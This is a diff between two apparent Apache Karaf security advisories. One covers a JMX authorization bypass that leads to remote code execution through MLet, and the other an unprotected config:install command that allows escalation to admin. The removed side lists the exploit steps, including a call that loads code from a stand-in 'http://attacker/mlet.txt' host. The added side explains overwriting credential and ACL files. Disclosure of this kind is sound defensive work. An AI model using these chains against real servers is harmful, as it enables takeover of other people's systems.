@@ -1,13 +1,13 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2026/09/28/11
-Message-ID: <a3d1633f-a90c-71af-4d24-8f1f3bca8824@apache.org>
-Date: Mon, 28 Sep 2026 16:17:45 +0000
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2026/09/28/10
+Message-ID: <a92cf85a-4714-e9e0-8f73-93e04b528ba5@apache.org>
+Date: Mon, 28 Sep 2026 16:08:52 +0000
 From: Jean-Baptiste Onofré <jbonofre@...che.org>
 To: oss-security@...ts.openwall.com
-Subject: CVE-2026-92142: Apache Karaf: Authorization bypass in JMX MBean lifecycle operations
+Subject: CVE-2026-91085: Apache Karaf: config:install missing ACL entry allows privilege escalation to admin
 Content-Type: text/plain; charset=utf-8
 
-Severity: important 
+Severity: moderate 
 
 Affected versions:
 
@@ -15,51 +15,34 @@ Affected versions:
 
 Description:
 
-Apache Karaf exposes a JMX MBeanServer guarded by KarafMBeanServerGuard, which enforces role-based access control (RBAC) on MBean operations invoked over the remote JMX connector (RMI registry/server, enabled by default on ports 1099 and 44444). The guard is implemented as a java.lang.reflect.Proxy around the MBeanServer, and only forwards a fixed list of operation names to the RBAC check, defined in MBeanInvocationHandler#guarded:
+Apache Karaf's shell/SSH command security is enforced by per-scope ACL configuration files (etc/org.apache.karaf.command.acl.<scope>.cfg). SecuredSessionFactoryImpl.checkSecurity() resolves the roles required for an invocation and, when no ACL rule matches the command, fails open: ACLConfigurationParser.Specificity.NO_MATCH sets passCheck = true. The safety valve for this, karaf.secured.command.compulsory.roles, ships commented out in etc/system.properties, so an unmatched command is allowed for any authenticated user.
 
 
-  private final List<String> guarded = Collections.unmodifiableList( Arrays.asList("invoke", "getAttribute", "getAttributes", "setAttribute", "setAttributes"));
-
-
-
-
-The MBean lifecycle operations MBeanServer#createMBean, #registerMBean and #unregisterMBean are not in this list. Calls to these methods are forwarded directly to the underlying MBeanServer with no role check at all, regardless of the roles configured in etc/jmx.acl.*.cfg.
+The shipped org.apache.karaf.command.acl.config ACL (assemblies/features/standard/src/main/feature/feature.xml, mirrored into instance/.../etc/org.apache.karaf.command.acl.config.cfg) has no install entry. It restricts delete to admin, restricts edit/property-*/update on the jmx.acl.*, org.apache.karaf.command.acl.* and org.apache.karaf.service.acl.* PIDs to admin, and allows manager for everything else, but config:install was simply unmatched, and therefore allowed for any authenticated user, including one holding only the viewer role.
 
 
 
 
-As a result, any user who can authenticate to the JMX endpoint, including a user holding only the least-privileged "viewer" role, can call createMBean() to instantiate an arbitrary class as a MBean, and unregisterMBean() to remove it again afterwards, with no authorization check and no audit log entry (logging in KarafMBeanServerGuard only occurs on the RBAC-denial path, which this bypass never reaches).
+config:install <url> <finalname> fetches url and writes it into ${karaf.etc} as finalname. It calls PathUtils.checkWithin() to block .. traversal outside karaf.etc, but that folder holds every security-relevant file Karaf ships: users.properties, keys.properties, host.key, and all org.apache.karaf.*.acl.* files, including the very ACL file that (mis)governs this command. With -o/--override, an existing file is overwritten with attacker-controlled bytes fetched from an arbitrary URL.
 
 
 
 
-This is significant because javax.management.loading.MLet, a standard JDK MBean, can be instantiated this way. MLet acts as a remote classloader: its getMBeansFromURL(URL) operation fetches an MLet text file from an attacker-controlled URL and instantiates and registers the classes it lists as new MBeans in the target JVM. Reaching this operation still goes through KarafMBeanServerGuard's existing "invoke" check, but the default etc/jmx.acl.cfg grants the "viewer" role to any method name matching the wildcard rule "get* = viewer", a heuristic intended for read-only getters. Because "getMBeansFromURL" happens to start with "get", it also matches that rule, so a default installation grants "viewer" callers permission to invoke it without any Karaf-specific ACL naming MLet at all. Combined with the createMBean gap, this gives a "viewer"-role JMX client a path to remote code execution to the Karaf JVM:
-
-  *  Authenticate to JMX as any user with any role (e.g. "viewer").
-  *  mbs.createMBean("javax.management.loading.MLet", objectName) is not in GUARDED_OPERATIONS, no RBAC check, MLet is instantiated and registered.
-  *  mbs.invoke(objectName, "getMBeansFromURL", new Object[]{"http://attacker/mlet.txt"}, ...) is guarded, but the method name matches the default "get* = viewer" ACL rule, so permitted.
-  *  The remote .mlet file is fetched and its listed classes are loaded and registered as new MBeans, running attacker-supplied code in the Karaf JVM.
-  *  mbs.unregisterMBean(objectName) can be used to remove the MLet afterwards, also not in GUARDED_OPERATIONS, no RBAC check, no audit trail.
-
-
-The fix adds createMBean, registerMBean and unregisterMBean to the guarded operation list, resolves required roles for them from the jmx.acl* configuration by ObjectName and (for createMBean/registerMBean) MBean class name, and ships default etc/jmx.acl.cfg entries restricting all three operations to the "admin" role. This allows deployments to also write class-name-specific rule, e.g.:
+Because felix.fileinstall.dir = ${karaf.etc} (etc/config.properties), Felix FileInstall also watches and reloads any .cfg file dropped there, closing the loop without requiring a restart.
 
 
 
 
-createMBean(java.lang.String)[/javax\.management\.loading\..*/] = admin
+By contrast, bundle:install, feature:install and kar:install are all admin-only in their own ACLs, and config:delete is admin in this same ACL, config:install was the outlier.
 
-
-
-
-Apache Karaf users should upgrade to 4.4.12 or 4.5.0 or later, once released, as soon as possible. Until an upgrade is available, restrict network access to the JMX RMI registry/server ports (1099/44444) to trusted hosts, or avoid issuing any non-"admin" JMX credentiels.
+MitigationAdd install = admin in etc/org.apache.karaf.command.acl.config.cfg (create the file is absent), and/or set karaf.secured.command.compulsory.roles=admin in etc/system.properties (and restart) to make unmatched commands fail closed by default.
 
 Credit:
 
-MopMonk-AI <mopmonk-ai@...hant.com> (reporter)
+Rin Ray <rindilray@...il.com> (reporter)
 
 References:
 
 https://karaf.apache.org/
-https://www.cve.org/CVERecord?id=CVE-2026-92142
+https://www.cve.org/CVERecord?id=CVE-2026-91085
 
